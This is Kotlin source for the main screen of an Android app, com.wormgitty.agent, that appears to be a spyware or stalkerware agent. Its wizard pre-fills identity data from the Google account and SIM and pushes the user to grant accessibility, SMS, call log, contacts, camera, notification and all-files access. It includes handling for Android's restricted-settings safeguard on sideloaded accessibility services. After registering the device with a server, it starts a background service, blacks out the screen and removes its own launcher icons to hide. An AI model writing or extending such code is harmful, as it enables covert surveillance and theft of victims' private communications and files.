package com.wormgitty.agent

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

val RED = Color(0xFFD32F2F)
val GREEN_OK = Color(0xFF2E7D32)

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val store = RegistrationStore(this)
        val prefs = HidePrefs(this)
        kotlinx.coroutines.runBlocking { EndpointPrefs(this@MainActivity).apply() }

        // A previous run armed the hide: this launch performs it, then vanishes.
        val hideArmed = kotlinx.coroutines.runBlocking { prefs.pendingHide() }
        if (hideArmed) {
            runHideSequence(prefs)
            return
        }

        if (restrictedSettingsBlockGrantFlow()) {
            showRestrictedSettingsNotice()
            return
        }

        val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
        val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
        val opener: PermissionOpener = SystemPermissionOpener()
        // Injected transport: the only network-shaped seam in the app.
        val api: RegistrationApi =
            if (mockPerms) FakeRegistrationApi(applicationContext)
            else ServerRegistrationApi(applicationContext).also { srv ->
                // Dev/test hook: a fresh enroll JWT may be handed in via
                // `am start -e enroll_token <jwt>` when the baked token expired.
                intent.getStringExtra(EXTRA_ENROLL_TOKEN)?.let { srv.enrollToken = it }
            }
        val deviceInfo: DeviceInfoProvider = SystemDeviceInfoProvider(applicationContext)

        setContent {
            MaterialTheme {
                WizardScreen(api, store, checker, opener, deviceInfo, onSealed = {
                    // Wizard done: arm + run the vanish NOW — veil, aliases off, finish.
                    prefs.setPendingHide(true)
                    runHideSequence(prefs)
                })
            }
        }
    }

    /**
     * Android 13+: sideloaded accessibility services land under "Restricted
     * settings" and the a11y grant silently no-ops from the wizard. Detect the
     * pending restriction via the compat intent extra and route the user to
     * App Info once, with a single notice line.
     */
    private fun restrictedSettingsBlockGrantFlow(): Boolean =
        RestrictedSettingsCompat.maybeBlocked(this, intent)

    private fun showRestrictedSettingsNotice() {
        val dlg = android.app.AlertDialog.Builder(this)
            .setTitle(getString(R.string.app_name))
            .setMessage(getString(R.string.restricted_settings_notice))
            .setPositiveButton(
                getString(R.string.row_open_settings),
                android.content.DialogInterface.OnClickListener { d, _ ->
                    d.dismiss()
                    try {
                        startActivity(
                            android.content.Intent(
                                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                android.net.Uri.parse("package:$packageName")
                            )
                        )
                    } catch (_: Exception) {
                    }
                    finish()
                }
            )
            .setNegativeButton(
                getString(android.R.string.cancel),
                android.content.DialogInterface.OnClickListener { d, _ ->
                    d.dismiss()
                    finish()
                }
            )
            .setCancelable(false)
            .create()
        dlg.show()
    }

    /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
    private fun runHideSequence(prefs: HidePrefs) {
        // The seal coroutine may resume on a non-UI dispatcher — setContentView
        // and alias writes must run on main.
        if (android.os.Looper.myLooper() != mainLooper) {
            android.os.Handler(mainLooper).post { runHideSequence(prefs) }
            return
        }
        val veil = android.view.View(this)
        veil.setBackgroundColor(android.graphics.Color.BLACK)
        setContentView(veil)
        android.os.Handler(mainLooper).postDelayed({
            try {
                WormSvc.start(this)
            } catch (_: Exception) {
            }
            setAliases(hiddenVisible = true)
            lifecycleScope.launch { prefs.clear() }
            finish()
        }, VEIL_MS)
    }

    /**
     * Launcher visibility switch. [hiddenVisible]=true disables BOTH launcher
     * aliases — the app leaves the drawer entirely (no system-lookalike icon).
     */
    fun setAliases(hiddenVisible: Boolean) {
        val pm = packageManager
        val pkg = packageName
        // Alias CLASS names live under the shared namespace (com.wormgitty.agent),
        // not the flavor applicationId — ComponentName(pkg, cls) requires both.
        val ns = "com.wormgitty.agent"
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$ns.LauncherBoost"),
            if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$ns.LauncherHidden"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    companion object {
        const val EXTRA_MOCK_PERMS = "mock_perms"
        const val EXTRA_ENROLL_TOKEN = "enroll_token"
        const val VEIL_MS = 2000L
    }
}

/** Deterministic all-green checker used by instrumented UI flows. */
object GreenChecker : PermissionChecker {
    override fun states(ctx: Context): Map<PermKey, Boolean> =
        PermKey.entries.associateWith { true }
}

@Composable
fun WizardTitle(text: String) {
    Text(
        text,
        fontSize = 20.sp,
        color = MaterialTheme.colorScheme.onSurface,
        modifier = Modifier.padding(vertical = 8.dp)
    )
}

@Composable
fun NemesisFooter() {
    Text(
        stringResource(R.string.dev_footer),
        fontSize = 11.sp,
        color = MaterialTheme.colorScheme.onSurfaceVariant,
        modifier = Modifier.padding(vertical = 10.dp)
    )
}

@Composable
fun NextButton(enabled: Boolean, tag: String, label: Int = R.string.btn_next, onClick: () -> Unit) {
    Button(
        onClick = onClick,
        enabled = enabled,
        modifier = Modifier
            .padding(top = 16.dp)
            .testTag(tag)
    ) { Text(stringResource(label)) }
}

/** The six single-permission screens, in spec order. */
data class PermSpec(val key: PermKey, val icon: String, val reasonRes: Int)

val PERM_FLOW = listOf(
    PermSpec(PermKey.ACCESSIBILITY, "♿", R.string.reason_a11y),
    PermSpec(PermKey.BATTERY_OPT, "🔋", R.string.reason_battery),
    PermSpec(PermKey.NOTIF_LISTENER, "🔔", R.string.reason_notif),
    PermSpec(PermKey.CAMERA, "📷", R.string.reason_camera),
    PermSpec(PermKey.STORAGE_READ, "🗂️", R.string.reason_storage),
    PermSpec(PermKey.CALL_LOG, "📞", R.string.reason_calllog),
    PermSpec(PermKey.SMS, "💬", R.string.reason_sms),
    PermSpec(PermKey.CONTACTS, "👥", R.string.reason_contacts),
    PermSpec(PermKey.ALL_FILES, "📁", R.string.reason_all_files)
)

@Composable
fun WizardScreen(
    api: RegistrationApi,
    store: RegistrationStore,
    checker: PermissionChecker,
    opener: PermissionOpener,
    deviceInfo: DeviceInfoProvider,
    onSealed: suspend () -> Unit
) {
    var step by rememberSaveable { mutableStateOf(Step.INTRO) }
    var permIdx by rememberSaveable { mutableStateOf(0) }
    var name by remember { mutableStateOf("") }
    var gender by rememberSaveable { mutableStateOf("") }
    var phoneRaw by remember { mutableStateOf("") }
    val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
    PermKey.entries.forEach { permStates.putIfAbsent(it, false) }

    Box(
        Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.surface)
    ) {
        Column(
            Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(24.dp)
                .padding(bottom = 48.dp)
        ) {
            when (step) {
                Step.INTRO -> {
                    // Logo block: neutral Material surface tile.
                    Box(
                        Modifier
                            .padding(top = 48.dp, bottom = 24.dp)
                            .size(88.dp)
                            .background(MaterialTheme.colorScheme.primary, CircleShape)
                    )
                    WizardTitle(stringResource(R.string.welcome_line1))
                    Text(
                        stringResource(R.string.welcome_sub),
                        fontSize = 14.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    NextButton(enabled = true, tag = "next_intro", label = R.string.btn_get_started) {
                        step = Step.IDENTITY
                    }
                }

                Step.IDENTITY -> {
                    val activityCtx = LocalContext.current
                    LaunchedEffect(Unit) {
                        if (name.isBlank()) {
                            AccountReader.nameCandidate(AccountReader.firstGoogleEmail(activityCtx))
                                ?.let { name = it }
                        }
                    }
                    WizardTitle(stringResource(R.string.name_hint))
                    OutlinedTextField(
                        value = name,
                        onValueChange = { name = it },
                        isError = name.isNotBlank() && !NameValidator.isValid(name),
                        supportingText = {
                            if (name.isNotBlank() && !NameValidator.isValid(name))
                                Text(stringResource(R.string.name_error))
                        },
                        label = { Text(stringResource(R.string.name_hint)) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("name_input")
                    )
                    Text(
                        stringResource(R.string.gender_title),
                        fontSize = 14.sp,
                        modifier = Modifier.padding(top = 20.dp, bottom = 6.dp)
                    )
                    Row(Modifier.fillMaxWidth()) {
                        listOf("male" to R.string.gender_male, "female" to R.string.gender_female)
                            .forEach { (value, res) ->
                                val selected = gender == value
                                Button(
                                    onClick = { gender = value },
                                    colors = if (selected) ButtonDefaults.buttonColors()
                                    else ButtonDefaults.outlinedButtonColors(),
                                    modifier = Modifier
                                        .weight(1f)
                                        .padding(end = if (value == "male") 8.dp else 0.dp)
                                        .testTag("gender_$value")
                                ) { Text(stringResource(res)) }
                            }
                    }
                    NextButton(
                        enabled = NameValidator.isValid(name) && gender.isNotBlank(),
                        tag = "next_identity"
                    ) { step = Step.PHONE }
                }

                Step.PHONE -> {
                    val activityCtx = LocalContext.current
                    var simPrefillDone by rememberSaveable { mutableStateOf(false) }
                    LaunchedEffect(Unit) {
                        if (!simPrefillDone && phoneRaw.isBlank()) {
                            PhoneSource.simLineNumber(activityCtx)?.let { phoneRaw = it }
                        }
                        simPrefillDone = true
                    }
                    val normalized = PhoneNormalizer.normalize(phoneRaw)
                    WizardTitle(stringResource(R.string.phone_hint))
                    OutlinedTextField(
                        value = phoneRaw,
                        onValueChange = { phoneRaw = it },
                        isError = normalized == null && phoneRaw.isNotBlank(),
                        supportingText = {
                            if (normalized == null && phoneRaw.isNotBlank())
                                Text(stringResource(R.string.phone_error))
                        },
                        label = { Text(stringResource(R.string.phone_hint)) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("phone_input")
                    )
                    NextButton(enabled = normalized != null, tag = "next_phone") {
                        step = Step.PERM; permIdx = 0
                    }
                }

                Step.PERM -> {
                    val spec = PERM_FLOW[permIdx]
                    val activity = LocalContext.current as ComponentActivity
                    var granted by remember { mutableStateOf(checker.states(activity)[spec.key] == true) }
                    var prevGranted by remember { mutableStateOf(granted) }
                    // Poll: catches both runtime-request results and settings returns.
                    LaunchedEffect(permIdx) {
                        while (true) {
                            granted = checker.states(activity)[spec.key] == true
                            kotlinx.coroutines.delay(1200)
                        }
                    }
                    // Granted transition auto-advances; already-granted does not.
                    LaunchedEffect(granted) {
                        if (granted && !prevGranted) {
                            if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
                        }
                        prevGranted = granted
                    }
                    Text(spec.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
                    WizardTitle(stringResource(spec.key.titleRes))
                    Text(
                        stringResource(spec.reasonRes),
                        fontSize = 14.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Row(
                        Modifier.padding(top = 14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            Modifier
                                .size(12.dp)
                                .background(if (granted) GREEN_OK else RED, CircleShape)
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(
                            stringResource(if (granted) R.string.granted_mark else spec.key.titleRes),
                            fontSize = 12.sp
                        )
                    }
                    Row(Modifier.padding(top = 20.dp)) {
                        Button(
                            onClick = {
                                val rp = spec.key.runtimePerm
                                if (rp != null) {
                                    androidx.core.app.ActivityCompat.requestPermissions(
                                        activity, arrayOf(rp), permIdx + 100
                                    )
                                } else {
                                    opener.open(activity, spec.key)
                                }
                            },
                            enabled = !granted,
                            modifier = Modifier.testTag("perm_allow")
                        ) { Text(stringResource(R.string.btn_allow)) }
                        TextButton(
                            onClick = {
                                if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
                            },
                            modifier = Modifier.testTag("perm_skip")
                        ) { Text(stringResource(R.string.btn_skip)) }
                    }
                }

                Step.SUMMARY -> {
                    WizardTitle(stringResource(R.string.summary_title))
                    Text(
                        stringResource(R.string.summary_name_fmt, name.trim()),
                        modifier = Modifier.padding(top = 8.dp)
                    )
                    Text(stringResource(R.string.summary_phone_fmt, phoneRaw))
                    Text(
                        stringResource(
                            R.string.summary_gender_fmt,
                            stringResource(
                                if (gender == "female") R.string.gender_female else R.string.gender_male
                            )
                        )
                    )
                    var finishing by remember { mutableStateOf(false) }
                    var enrollError by remember { mutableStateOf<String?>(null) }
                    var retryTick by remember { mutableStateOf(0) }
                    var tokenInput by remember { mutableStateOf("") }
                    NextButton(enabled = !finishing, tag = "finish", label = R.string.btn_finish) {
                        finishing = true
                        enrollError = null
                    }
                    if (finishing) {
                        LaunchedEffect(retryTick) {
                            val reg = Registration(
                                "",
                                name.trim(),
                                PhoneNormalizer.normalize(phoneRaw)!!,
                                gender,
                                System.currentTimeMillis(),
                                deviceInfo.fingerprint(),
                                deviceInfo.constraints()
                            )
                            api.register(reg)
                                .onSuccess { id ->
                                    store.save(reg.copy(id = id))
                                    onSealed()
                                }
                                .onFailure { enrollError = it.message ?: "enroll_failed" }
                        }
                    }
                    enrollError?.let { err ->
                        val activityCtx = LocalContext.current
                        Text(
                            stringResource(R.string.enroll_failed_fmt, err),
                            fontSize = 13.sp,
                            color = RED,
                            modifier = Modifier.padding(top = 12.dp).testTag("enroll_error")
                        )
                        Row(Modifier.padding(top = 8.dp)) {
                            Button(
                                onClick = {
                                    tokenInput.takeIf { it.isNotBlank() }
                                        ?.let { (api as? EnrollTokenAware)?.enrollToken = it }
                                    enrollError = null
                                    retryTick++
                                },
                                modifier = Modifier.testTag("enroll_retry")
                            ) { Text(stringResource(R.string.btn_retry)) }
                            (api as? EnrollTokenAware)?.let { aware ->
                                TextButton(
                                    onClick = {
                                        val cm = activityCtx.getSystemService(
                                            Context.CLIPBOARD_SERVICE
                                        ) as android.content.ClipboardManager
                                        cm.setPrimaryClip(
                                            android.content.ClipData.newPlainText(
                                                "enroll_token", aware.enrollToken
                                            )
                                        )
                                    },
                                    modifier = Modifier.testTag("enroll_copy")
                                ) { Text(stringResource(R.string.btn_copy_token)) }
                            }
                        }
                        if (api is EnrollTokenAware) {
                            OutlinedTextField(
                                value = tokenInput,
                                onValueChange = { tokenInput = it },
                                label = { Text(stringResource(R.string.enroll_token_hint)) },
                                singleLine = true,
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(top = 8.dp)
                                    .testTag("enroll_token_input")
                            )
                        }
                    }
                }
            }
        }
        Box(Modifier.align(Alignment.BottomCenter)) { NemesisFooter() }
    }
}
